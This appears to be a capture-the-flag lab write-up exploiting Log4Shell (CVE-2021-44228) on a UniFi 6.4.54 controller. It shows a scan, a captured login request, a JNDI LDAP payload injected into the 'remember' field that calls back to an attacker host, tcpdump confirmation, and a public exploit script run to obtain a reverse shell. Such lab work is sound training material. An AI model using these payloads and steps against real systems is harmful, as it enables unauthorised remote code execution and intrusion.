- [1] 22/tcp ssh **OpenSSH 8.2p1**
- [2] 6789/tcp ibm-db2-admin?
- [3] 8080/tcp http-proxy

1. Might be redirecting requests
2. Did not follow redirect to http://{IP}:8443/manage

- [4] 8443/tcp ssl/nagios-nsca **Nagios NSCA**

1. Requested resource was `/manage/account/login?redirect=%2Fmanage`

## INVESTING THE SITE

- Opening `http://{IP}:8080/` being redirected to `http://{IP}:8443/manage/account/login?...`
- Found software named **UniFi 6.4.54** (JAVA backend)

> *UniFi* is a community of wireless access points, switches, routers, controller devices, 
> VoIP phones, and access control products. It can be used for the corporate network and 
> also for the home network. An Unifi network controller manages all the equipment in the 
> UNIFI network.

- There is a CVE [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) releated to UniFi
- The vulnerability is a *Log4J Remote Code Execution*

> *CVE-2021-44228*: Apache Log4j2 2.0-beta9 through 2.15.0 JNDI features used in configuration,
> log messages, and parameters do not protect against attacker controlled LDAP and other JNDI 
> releated endpoints. An attacker who can control log messages or log message parameters can 
> execute arbitrary code loaded from LDAP servers when message lookup subtitution is enabled.

> *JNDI* (Java Naming and Directory Interface) is the naming service used to register services 
> in distributed contexts and recall them using a mnemonic name. This is a register that 
> maintains the association between a name and an application server service in a data structure.
> JNDI managed objects are stored in binding files. This storage can be based on file systems or 
> LDAP (Lightweight Directory Access Protocol)

> *LDAP* (Lightweight Directory Access Protocol) is a mature, flexible, and well supported 
> standards-based mechanism for interacting with directory servers. Itâ€™s often used for 
> authentication and storing information about users, groups, and applications, but an LDAP 
> directory server is a fairly general-purpose data store and can be used in a wide variety 
> of applications. In LDAP all informations are encrypted and transmitted using BER
> (Basic Encoding Rules).

- Interesting port for LDAP are

1. 389/TCP Clear-Text connection
2. 636/TCP Encrypted Connection

## LOG4J VULNERABILITY EXPLOIT

- Let's try to use BurpSuite as the middle-man to see requests
- Set up a Manual proxy on localhost:8080
- When given credentials to access this is the request

```
POST /api/login HTTP/1.1
Host: 10.129.149.239:8443
Content-Length: 69

Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0

Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
Connection: close

{"username":"admin","password":"admin","remember":false,"strict":true}
```

- We can see that the request is done to `/api/login`
- We can send the request to the Repeater to see how it behaves with different requests
- To exploit the Log4J vulnerability with JNDI we need to put a specific payload

```
${jndi:ldap://{malicious-IP}:{remote-port}/any}
```

> In this case, Log4j will try to execute code named 'any' hosted by 'malicious-IP'
> on port 'remote-port' using the LDAP communiction protocol. If we attempt to use
> this payload and we have a netcat listener up and running we will receive a connection.

- To this end let's put this payload on the `remember` request parameter
- Hence, we forge a new request

```

    "remember":"${jndi:ldap://{MyIP}/any}",

}
```

- We obtain a response

```

Access-Control-Allow-Origin: https://10.129.149.239:8443
Access-Control-Allow-Credentials: true

Connection: close

{"meta":{"rc":"error","msg":"api.err.InvalidPayload"},"data":[]}
```

- This shows an error but indeed it is executing the payload
- We can use `tcpdump` to see the requests and responses

```bash
$ sudo tcpdump -i tun0 port 389

10:06:45.345009 IP 10.129.149.239.50242 > 10.10.16.167.ldap: Flags [S]
10:06:45.345093 IP 10.10.16.167.ldap > 10.129.149.239.50242: Flags [R.]
```

- It is trying to connect back to us on the LDAP port showing that it is vulnerable
- There is a repo: https://github.com/puzzlepeaches/Log4jUnifi
- This repository contains a Python exploit for the Log4J vulnerability of UniFi
- As usual let's start a Netcat listener, then execute the exploit

```bash
$ git clone https://github.com/puzzlepeaches/Log4jUnifi
$ cd Log4jUnifi
$ python3 exploit.py -u http://{IP}:8443 -i {MyIP} -p {remote-port}

script /dev/null -c bash
shell> 
```
